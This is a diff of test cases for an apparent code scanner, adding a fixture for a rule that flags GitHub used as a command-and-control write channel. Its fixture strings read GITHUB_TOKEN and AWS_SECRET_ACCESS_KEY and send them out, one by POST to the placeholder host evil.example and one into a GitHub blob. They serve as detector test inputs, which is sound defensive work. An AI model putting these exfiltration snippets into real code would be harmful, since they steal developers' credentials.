@@ -260,6 +260,13 @@ const t = process.env.GITHUB_TOKEN;
 fetch('https://evil.example/c', { method: 'POST', body: t });`,
 		},
 		{
+			name:     "jsrisk GitHub-as-C2 write channel through public API",
+			filename: "index.js",
+			ruleID:   "JS_GITHUB_C2_001",
+			content: `const k = process.env.AWS_SECRET_ACCESS_KEY;
+await octokit.git.createBlob({ owner, repo, content: k });`,
+		},
+		{
 			name:     "rsbuild wallet read -> network through public API",
 			filename: "build.rs",
 			ruleID:   "RS_BUILD_WALLET_EXFIL_001",
